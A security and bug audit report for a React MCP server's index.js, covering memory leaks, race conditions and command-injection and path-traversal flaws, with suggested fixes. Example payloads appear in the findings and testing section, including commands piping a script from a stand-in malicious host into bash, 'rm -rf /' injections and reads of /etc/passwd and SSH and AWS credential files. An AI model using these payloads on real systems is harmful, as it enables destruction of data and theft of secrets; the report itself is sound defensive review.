# Security and Bug Analysis Report for index.js

## Executive Summary

This analysis identified **26 critical issues** in the React MCP server implementation, including:
- **3 Critical Memory Leaks** that will cause server crashes
- **1 Critical Race Condition** that breaks core functionality
- **6 High-Severity Security Vulnerabilities** (command injection, path traversal)
- **Multiple Medium and Low-Severity Issues**

**Immediate Action Required**: The memory leaks and race condition will cause the server to fail in production. The security vulnerabilities expose the system to arbitrary code execution and file system access.

---

## Critical Issues (Must Fix Immediately)

### 1. Race Condition: Process Output Not Captured ⚠️ BREAKS FUNCTIONALITY
**Location**: Lines 72-82  
**Severity**: CRITICAL  
**Impact**: The `get-process-output` tool will always return empty strings

**Problem**: 
```javascript
let output = "";
let errorOutput = "";

childProcess.stdout.on('data', (data) => {
  const chunk = data.toString();
  output += chunk;  // Updates local variable
});

runningProcesses.set(processId, {
  output,  // Stores initial empty string
  errorOutput,  // Stores initial empty string
});
```

The variables `output` and `errorOutput` are primitive strings. When stored in the Map, their initial values (empty strings) are stored, not references. Subsequent updates to the local variables don't affect the stored values.

**Fix**:
```javascript
const processData = {
  process: childProcess,
  command,
  args,
  cwd,
  output: '',
  errorOutput: '',
  startTime: new Date(),
  processId,
};

childProcess.stdout.on('data', (data) => {
  processData.output += data.toString();  // Updates object property
});

childProcess.stderr.on('data', (data) => {
  processData.errorOutput += data.toString();
});

runningProcesses.set(processId, processData);
```

---

### 2. Memory Leak: Unbounded Log File Growth 💾
**Location**: Lines 31-47  
**Severity**: CRITICAL  
**Impact**: Server will crash after extended operation

**Problem**:
- Entire log file is read into memory on every log entry
- Log array grows indefinitely
- No rotation or size limits
- Eventually causes out-of-memory errors

**Current Behavior**:
```javascript
let jsonLogs = [];
if (fs.existsSync(jsonLogPath)) {
  const fileContent = fs.readFileSync(jsonLogPath, "utf8");
  jsonLogs = fileContent ? JSON.parse(fileContent) : [];
}
jsonLogs.push(logEntry);  // Array grows forever
fs.writeFileSync(jsonLogPath, JSON.stringify(jsonLogs, null, 2));
```

**Fix Options**:

Option 1 - Newline-delimited JSON (simplest):
```javascript
const logEntry = { timestamp, ...data };
fs.appendFileSync(jsonLogPath, JSON.stringify(logEntry) + '\n');
```

Option 2 - Log rotation:
```javascript
const MAX_LOG_SIZE = 10 * 1024 * 1024; // 10MB
if (fs.existsSync(jsonLogPath)) {
  const stats = fs.statSync(jsonLogPath);
  if (stats.size > MAX_LOG_SIZE) {
    fs.renameSync(jsonLogPath, `${jsonLogPath}.${Date.now()}.old`);
  }
}
fs.appendFileSync(jsonLogPath, JSON.stringify(logEntry) + '\n');
```

---

### 3. Memory Leak: Process Map Never Cleaned 💾
**Location**: Lines 85-95  
**Severity**: CRITICAL  
**Impact**: Memory exhaustion over time

**Problem**:
- Completed processes remain in `runningProcesses` Map forever
- Each process stores all output in memory
- No cleanup mechanism
- Long-running server will accumulate hundreds/thousands of dead processes

**Fix**:
```javascript
const processData = {
  process: childProcess,
  command,
  args,
  cwd,
  output: '',
  errorOutput: '',
  startTime: new Date(),
  processId,
};

// Add exit handler to clean up
childProcess.on('exit', (code, signal) => {
  processData.exitCode = code;
  processData.exitSignal = signal;
  
  // Remove from map after 5 minutes
  setTimeout(() => {
    runningProcesses.delete(processId);
  }, 300000);
});

runningProcesses.set(processId, processData);
```

Or implement periodic cleanup:
```javascript
setInterval(() => {
  const now = Date.now();
  for (const [id, info] of runningProcesses.entries()) {
    if (info.process.exitCode !== null && 
        now - info.startTime > 300000) {
      runningProcesses.delete(id);
    }
  }
}, 60000); // Clean up every minute
```

---

### 4. Memory Leak: Unbounded Output Accumulation 💾
**Location**: Lines 69-82  
**Severity**: CRITICAL  
**Impact**: Single verbose process can crash server

**Problem**:
- Process output accumulated without limits
- Long-running processes with verbose output (npm install, build processes) can generate gigabytes
- No truncation or streaming

**Fix**:
```javascript
const MAX_OUTPUT_SIZE = 1024 * 1024; // 1MB per stream

childProcess.stdout.on('data', (data) => {
  const chunk = data.toString();
  if (processData.output.length < MAX_OUTPUT_SIZE) {
    processData.output += chunk;
    if (processData.output.length >= MAX_OUTPUT_SIZE) {
      processData.output += '\n[Output truncated - size limit reached]';
    }
  }
});

childProcess.stderr.on('data', (data) => {
  const chunk = data.toString();
  if (processData.errorOutput.length < MAX_OUTPUT_SIZE) {
    processData.errorOutput += chunk;
    if (processData.errorOutput.length >= MAX_OUTPUT_SIZE) {
      processData.errorOutput += '\n[Error output truncated - size limit reached]';
    }
  }
});
```

---

## High-Severity Security Vulnerabilities 🔒

### 5. Command Injection: Arbitrary Command Execution
**Location**: Line 197 (`handleRunCommand`)  
**Severity**: HIGH  
**Impact**: Complete system compromise

**Problem**:
```javascript
async function handleRunCommand(params) {
  const { command, directory } = params;
  // No validation!
  const result = await executeCommand(command, { cwd: workingDir });
}
```

Any command can be executed: `rm -rf /`, `cat /etc/passwd`, `curl malicious.com | bash`, etc.

**Fix**:
```javascript
const ALLOWED_COMMANDS = ['npm', 'node', 'git', 'ls', 'cat', 'pwd', 'echo'];

async function handleRunCommand(params) {
  const { command, directory } = params;
  
  const commandParts = command.trim().split(/\s+/);
  const baseCommand = commandParts[0];
  
  if (!ALLOWED_COMMANDS.includes(baseCommand)) {
    throw new Error(`Command '${baseCommand}' is not allowed. Allowed: ${ALLOWED_COMMANDS.join(', ')}`);
  }
  
  // Validate directory
  const workingDir = directory || process.cwd();
  const resolvedDir = path.resolve(workingDir);
  const allowedBase = path.resolve(os.homedir());
  
  if (!resolvedDir.startsWith(allowedBase)) {
    throw new Error('Directory must be within user home directory');
  }
  
  const result = await executeCommand(command, { cwd: workingDir });
  return result;
}
```

---

### 6. Path Traversal: Arbitrary File Write
**Location**: Lines 335-340 (`handleEditFile`)  
**Severity**: HIGH  
**Impact**: Can overwrite any file on system

**Problem**:
```javascript
async function handleEditFile(params) {
  const { filePath, content } = params;
  // No validation!
  fs.writeFileSync(filePath, content, "utf8");
}
```

Attacker can write to:
- `/etc/passwd` (if running as root)
- `~/.ssh/authorized_keys` (add SSH keys)
- `~/.bashrc` (execute code on login)
- Any application configuration files

**Fix**:
```javascript
async function handleEditFile(params) {
  const { filePath, content } = params;
  
  // Resolve and validate path
  const resolvedPath = path.resolve(filePath);
  const allowedBase = path.resolve(os.homedir());
  
  if (!resolvedPath.startsWith(allowedBase)) {
    throw new Error('File path must be within user home directory');
  }
  
  // Block sensitive directories
  const sensitivePatterns = ['.ssh', '.aws', '.gnupg', '.config/gcloud'];
  for (const pattern of sensitivePatterns) {
    if (resolvedPath.includes(pattern)) {
      throw new Error(`Cannot write to sensitive directory: ${pattern}`);
    }
  }
  
  // Make sure directory exists
  const directory = path.dirname(resolvedPath);
  if (!fs.existsSync(directory)) {
    fs.mkdirSync(directory, { recursive: true });
  }
  
  fs.writeFileSync(resolvedPath, content, "utf8");
  
  return {
    message: `File ${resolvedPath} updated successfully`,
    filePath: resolvedPath,
    size: Buffer.byteLength(content, "utf8"),
  };
}
```

---

### 7. Path Traversal: Arbitrary File Read
**Location**: Line 357 (`handleReadFile`)  
**Severity**: HIGH  
**Impact**: Can read any file on system

**Problem**:
```javascript
async function handleReadFile(params) {
  const { filePath } = params;
  // No validation!
  const content = fs.readFileSync(filePath, "utf8");
}
```

Attacker can read:
- `/etc/passwd`, `/etc/shadow`
- `~/.ssh/id_rsa` (private keys)
- `~/.aws/credentials` (AWS keys)
- `.env` files (API keys, secrets)
- Application source code

**Fix**: Same validation as `handleEditFile`

---

### 8. Shell Injection: Command Arguments
**Location**: Lines 64-66 (`startProcess`)  
**Severity**: HIGH  
**Impact**: Command injection through arguments

**Problem**:
```javascript
const childProcess = spawn(command, args, {
  cwd,
  shell: true,  // Enables shell interpretation!
  env: { ...process.env, FORCE_COLOR: "true" },
});
```

With `shell: true`, special characters in `args` are interpreted by the shell:
- `npm start; rm -rf /` would execute both commands
- Backticks, pipes, redirects all work

**Fix**:
```javascript
const childProcess = spawn(command, args, {
  cwd,
  shell: false,  // Disable shell interpretation
  env: { ...process.env, FORCE_COLOR: "true" },
});
```

If shell is needed for some commands, use `execFile` with proper escaping or validate inputs strictly.

---

### 9. Command Injection: Project Name
**Location**: Line 113 (`handleCreateReactApp`)  
**Severity**: HIGH  
**Impact**: Arbitrary command execution

**Problem**:
```javascript
const createCommand = template
  ? `npx create-react-app ${name} --template ${template}`
  : `npx create-react-app ${name}`;
```

With `shell: true` in `startProcess`, a malicious name like `myapp; rm -rf /` executes arbitrary commands.

**Fix**:
```javascript
// Validate project name
if (!/^[a-z0-9-_]+$/i.test(name)) {
  throw new Error('Invalid project name. Only alphanumeric characters, hyphens, and underscores are allowed.');
}

// Validate template if provided
if (template && !/^[a-z0-9-]+$/i.test(template)) {
  throw new Error('Invalid template name. Only alphanumeric characters and hyphens are allowed.');
}
```

---

### 10. Command Injection: Package Name
**Location**: Line 398 (`handleInstallPackage`)  
**Severity**: HIGH  
**Impact**: Arbitrary command execution

**Problem**:
```javascript
const installCommand = dev
  ? `npm install ${packageName} --save-dev`
  : `npm install ${packageName}`;
```

Malicious package name: `lodash; curl malicious.com/script.sh | bash`

**Fix**:
```javascript
// Validate npm package name format
// Supports: package, @scope/package, package@version
const packageNameRegex = /^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*(@[a-z0-9-._~]+)?$/i;

if (!packageNameRegex.test(packageName)) {
  throw new Error('Invalid package name format');
}
```

---

## Medium-Severity Issues

### 11. Weak Random ID Generation
**Location**: Line 83  
**Severity**: MEDIUM  
**Impact**: Process ID collisions

**Problem**:
```javascript
const processId = Math.random().toString(36).substring(2, 15);
```

- Only 13 characters of randomness
- Collision probability increases with number of processes
- No collision detection

**Fix**:
```javascript
import { randomUUID } from 'crypto';
const processId = randomUUID();
```

---

### 12. Race Condition: Log File Concurrent Access
**Location**: Lines 31-36  
**Severity**: MEDIUM  
**Impact**: Lost log entries

**Problem**: Multiple concurrent requests read-modify-write the same log file, causing lost updates.

**Fix**: Use append-only operations or proper locking.

---

### 13. Invalid JSON Crash
**Location**: Lines 33-35  
**Severity**: MEDIUM  
**Impact**: Server crash on corrupted log file

**Problem**:
```javascript
const fileContent = fs.readFileSync(jsonLogPath, "utf8");
jsonLogs = fileContent ? JSON.parse(fileContent) : [];  // Can throw
```

**Fix**:
```javascript
try {
  const fileContent = fs.readFileSync(jsonLogPath, "utf8");
  jsonLogs = fileContent ? JSON.parse(fileContent) : [];
} catch (error) {
  console.error('Failed to parse log file, starting fresh:', error);
  jsonLogs = [];
  // Backup corrupted file
  if (fs.existsSync(jsonLogPath)) {
    fs.renameSync(jsonLogPath, `${jsonLogPath}.corrupted.${Date.now()}`);
  }
}
```

---

### 14. Package.json Parse Error
**Location**: Lines 168-170  
**Severity**: MEDIUM  
**Impact**: Unhandled exception

**Fix**: Wrap in try-catch with helpful error message.

---

### 15. Process Exit Code Check Unreliable
**Location**: Line 237  
**Severity**: MEDIUM  
**Impact**: Incorrect process status reporting

**Problem**: `exitCode === null` doesn't account for all edge cases.

**Fix**:
```javascript
const isRunning = processInfo.process.exitCode === null && 
                  !processInfo.process.killed &&
                  processInfo.process.pid !== undefined;
```

---

### 16. Process Start Race Condition
**Location**: Line 131  
**Severity**: MEDIUM  
**Impact**: Returns processId for failed process

**Problem**: Function returns immediately, but process might fail to start.

**Fix**: Add startup validation delay.

---

### 17. Hardcoded Port Assumption
**Location**: Line 177  
**Severity**: MEDIUM  
**Impact**: Misleading user information

**Problem**: Assumes React runs on port 3000, but it might use 3001, 3002, etc.

**Fix**: Parse process output to detect actual port.

---

### 18. Process Kill Without Cleanup
**Location**: Line 280  
**Severity**: MEDIUM  
**Impact**: Dead processes remain in memory

**Fix**: Remove from Map after killing and add exit handler.

---

## Low-Severity Issues

### 19. Directory Creation Race Condition
**Location**: Lines 14-16  
**Fix**: Use `{ recursive: true }` option and handle EEXIST errors.

---

### 20. Incomplete Cleanup on Exit
**Location**: Lines 656-664  
**Fix**: Remove event listeners before killing processes.

---

### 21. Signal Handler Race Condition
**Location**: Lines 666-672  
**Fix**: Make cleanup synchronous before calling `process.exit()`.

---

### 22. Synchronous File Operations
**Location**: Lines 48-50  
**Severity**: LOW  
**Impact**: Event loop blocking

**Fix**: Use async file operations (`fs.promises`).

---

### 23. Large File Read Memory Issue
**Location**: Lines 357-368  
**Fix**: Add file size validation before reading.

---

## Recommendations

### Immediate Actions (Critical)
1. **Fix the race condition** in process output capture (Issue #1)
2. **Implement log rotation** to prevent memory exhaustion (Issue #2)
3. **Add process cleanup** to prevent memory leaks (Issue #3)
4. **Add output size limits** to prevent memory exhaustion (Issue #4)

### High Priority (Security)
5. **Implement command whitelisting** for run-command tool
6. **Add path validation** for file operations
7. **Remove `shell: true`** from spawn calls
8. **Validate all user inputs** (names, templates, packages)

### Medium Priority
9. Use `crypto.randomUUID()` for process IDs
10. Add error handling for JSON parsing
11. Implement proper process status checking
12. Add startup validation for processes

### Low Priority (Quality)
13. Convert to async file operations
14. Add file size limits
15. Improve cleanup handlers
16. Add comprehensive logging

### Architecture Improvements
- Consider using a proper logging library (Winston, Pino)
- Implement rate limiting for command execution
- Add authentication/authorization layer
- Consider sandboxing child processes
- Add metrics and monitoring
- Implement proper error boundaries

---

## Testing Recommendations

### Security Testing
```bash
# Test command injection
curl -X POST -d '{"command": "ls; cat /etc/passwd"}' 

# Test path traversal
curl -X POST -d '{"filePath": "../../etc/passwd"}'

# Test malicious package names
curl -X POST -d '{"packageName": "lodash; rm -rf /"}'
```

### Memory Testing
```bash
# Create many processes to test cleanup
for i in {1..100}; do
  # Create process
  # Check memory usage
done

# Run verbose process to test output limits
npm install --verbose
```

### Race Condition Testing
```bash
# Concurrent log writes
for i in {1..50}; do
  curl -X POST & 
done
wait
# Check log integrity
```

---

## Conclusion

The React MCP server has **critical issues that will cause failures in production**:
- Memory leaks will crash the server
- Race condition breaks core functionality
- Security vulnerabilities expose the system to attacks

**Priority**: Fix critical issues immediately before deploying to production.

**Estimated Effort**: 
- Critical fixes: 4-8 hours
- Security fixes: 8-16 hours
- All fixes: 20-30 hours

**Risk Level**: 🔴 **HIGH** - Do not use in production without fixes.
